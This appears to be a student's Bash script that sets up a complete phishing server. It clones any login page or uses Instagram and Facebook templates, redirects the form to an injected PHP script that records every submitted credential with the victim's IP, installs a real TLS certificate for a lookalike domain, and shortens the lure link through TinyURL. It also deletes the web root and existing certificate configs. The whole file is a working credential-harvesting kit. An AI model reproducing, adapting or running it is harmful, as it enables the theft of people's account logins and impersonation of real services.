#!/bin/bash

#Name: Evgeni Genchev
#Student code: s6
#Class code: TCB-2511
#Lecture's name: Ivan Blagoev

tools="apache2 wget certbot curl php"
libraries="libapache2-mod-php python3-certbot-apache"
server_dir="/var/www/html" 

# Function which installs dependency
# It takes the name of the dependency as an argument
function install(){
	echo "Installing missing dependency: $1"
	sudo apt install "$1" -y > /dev/null 2>&1
	if [ $? -ne 0 ]; then
		echo "Unable to install missing dependency: $1"
		exit 1
	else
		echo "Missing dependency installed $1"
	fi
}

# Function that downloads the page to a directory in the server directory
# It takes as arguments the page url and the path in the server directory
function download(){
	sudo wget "$1" -qP "$server_dir/$2" -U "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0" --no-check-certificate
}

# Function which removes everything from the apache directory 
function free_server(){
	echo "Deleting the content on the server"
	sudo rm -rf "$server_dir/"*
}

# Function that saves the php code to the correct directory. 
# Furthermore personalise the code for the different urls, 
# so it redirects to the right one and also save the stolen credential in separate files
# It takes as arguments the domain of the cloned page, as well as the full url
# The directory where the data are saved is /var/www/data
# The default permissions are overwriten, so the data can be saved
function php_injection(){
echo "Injecting the php"
echo "<?php

if (\$_SERVER['REQUEST_METHOD'] === 'POST') {
    \$data = \$_POST;
    \$file = '/var/www/data/$1.json';

    foreach (\$_POST as \$key => \$value) {
        \$data[\"\$key\"] = \"\$value\";
    }
    \$data['time'] = date('Y-m-d H:i:s');
    \$data['ip'] = \$_SERVER['REMOTE_ADDR'] ?? '';

    \$existing = file_exists(\$file)
        ? json_decode(file_get_contents(\$file), true)
        : [];

    \$existing[] = \$data;

    file_put_contents(
        \$file,
        json_encode(\$existing, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES),
        LOCK_EX
    );
    header(\"Location: $2\");
}
exit;
?>" | sudo tee "$server_dir/$3/login.php" > /dev/null
sudo mkdir -p /var/www/data
sudo chown www-data:www-data /var/www/data
sudo chmod 744 /var/www/data
}

# Function that clones the website page after freeing the server, 
# replacing all relative references with their absolute ones, 
# finding the form and adding/editing the action and the method
function clone_website(){
	read -p "Enter url: " url
	free_server
	# Gets everything after the domain
	url_path=$(echo "$url" | grep -oP 'https?://[^/]+/\K.*')
	echo "Downloading the page" 
	# Checks wheather the url ands with .html page or with directory (the html page is called index, meaning the server can omits it)
	if [ -z $(echo "$url_path" | grep "\.html$") ]; then
		# Makes the missing directories if there are any
		sudo mkdir -p "$server_dir/$url_path"
		download "$url" "$url_path"
		# Gets the name under which the page was saved, which is the last directory name
		file=$(echo "$url_path" | grep -oP '[/$]+\K.*')
		# Changes the page file name to index.html, as that is the right one
		sudo mv "$server_dir/$url_path/$file" "$server_dir/$url_path/index.html"
		file="index.html"
	else
		# Gets the directories, without the file name
		url_path=$(echo "$url_path" | grep -o '.*/')
		# Makes the missing directories if there are any
		sudo mkdir -p "$server_dir/$url_path"
		download "$url" "$url_path"
		# Gets the name of the page file
		file=$(echo "$url" | grep -oP '/\K.*\.html')
	fi
	
	# Gets the content of the page
	temp=$(cat "$server_dir/$url_path/$file")
	# Gets all the relative paths from the page
	local_refs=$(echo "$temp" | grep -oP '(href|src)="\K(?!https?:|mailto:|tel:)[^"]+')
	for ref in $local_refs; do
		# Gets the url, without the page name and concats it with the relative path, so it can be accessed from the apache
		href="$(echo "$url" | grep -o ".*/")$ref"
		# Replaces the relative path with the absolute one
		temp=$(echo "$temp" | sed "s|\"$ref\"|\"$href\"|g")
	done
	# Gets the form opening tag
	form=$(echo "$temp" | grep -oP '<form[^>]*')
	# Gets the action of the form
	action=$(echo "$form" | grep -oP 'action="\K[^"]*')
	# Gets the method of the form
	method=$(echo "$form" | grep -oP 'method="\K[^"]*')
	# Checks if there is action, if so it replaces it with the correct one, otherwise it just adds it
	if [ -z $action ]; then
		replacement=$(echo "$form" | sed 's|form|form action=\"login.php\"|g')
	else
		replacement=$(echo "$form" | sed "s|$action|login.php|g")
	fi
	# Checks if there is method, if so it replaces it with the correct one, otherwise it just adds it
	if [ -z $method ]; then
		replacement=$(echo "$replacement" | sed 's|form|form method=\"POST\"|g')
	else
		replacement=$(echo "$replacement" | sed "s|$method|POST|g")
	fi
	# Replaces the old form tag with the updated one
	temp=$(echo "$temp" | sed "s|$form|$replacement|g")
	# Saves the changed file
	echo "$temp" | sudo tee "$server_dir/$url_path/$file" > /dev/null
	php_injection $(echo "$url" | grep -oP 'https?://\K[^/]*') "$url" "$url_path"
}

# Function which asks for the number of template,
# when given frees the server, copies the template to the apache and injects the php 
function use_template(){
echo "[*] Choose template:
  [1] Instagram
  [2] Facebook"
read -p "Enter a number: " template
free_server
case $template in
	1)
		echo "Cloning the template"
		sudo cp "$(pwd)/templates/instagram/"* /var/www/html/ -r
		php_injection "instagram.com" "https://www.instagram.com" ""

	;;
	2)
		echo "Cloning the template"
		sudo cp "$(pwd)/templates/facebook/"* /var/www/html/ -r
		php_injection "facebook.com" "https://www.facebook.com" ""
	;;
	*)
		echo "Wrong option"
		exit 1
	;;
esac

}

# Checks for missing tools and installs them if there are any
for tool in $tools; do
	if ! command -v "$tool" > /dev/null 2>&1 ; then
		install "$tool"
	fi
done

# Checks for missing libraries and installs them if there are any
for lib in $libraries; do
	if [[ -z $(dpkg -l | grep "$lib") ]]; then
	install "$lib"
fi
done

clear
figlet "Fishing"

echo "
[*] Select a method:
  [1] Clone a website
  [2] Use built-in template"
read -p "Enter a number: " method
case $method in
	1)
		clone_website
	;;
	2)
		use_template
	;;
	*)
		echo "Wrong option"
		exit 1
	;;
esac

read -p "Do you have a custom domain? y/[n] " has_domain

# If it has domain it configures the apache with ssl certificate (not self-signed),
# otherwise serves the page through HTTP
case $has_domain in
	"yes" | "y")
		read -p "Enter your domain name: " domain
		echo "Configuring SSL"
		# Enables SSL
		sudo service apache2 start
		sudo a2enmod ssl > /dev/null
		sudo systemctl reload apache2
		echo "Removing installed certificates"
		# Removes installed configuration with certificates from the apache
		sudo rm -f /etc/apache2/sites-available/*-le-*.conf
		sudo rm -f /etc/apache2/sites-enabled/*-le-*.conf
		echo "Installing certificate for $domain"
		# Generates and installs the certificate for the given domain after it verifies it
		sudo certbot --apache -nd "$domain" > /dev/null
		echo "Certificate installed"
		phishing_url="https://$domain/$url_path/$file"
	;;
	"no" | "n" | *)
		# Gets the private ip address
		ip=$(ifconfig | grep broadcast | awk '{print $2}')
		phishing_url="http://$ip/$url_path/$file"
	;;
esac

echo "Restarting the server"
sudo service apache2 restart
echo "Ready to fish"
# It gets the compressed version of the url from TinyURL though GET request
echo "Compressed link to the page: $(curl -s "https://tinyurl.com/api-create.php?url=$phishing_url")"
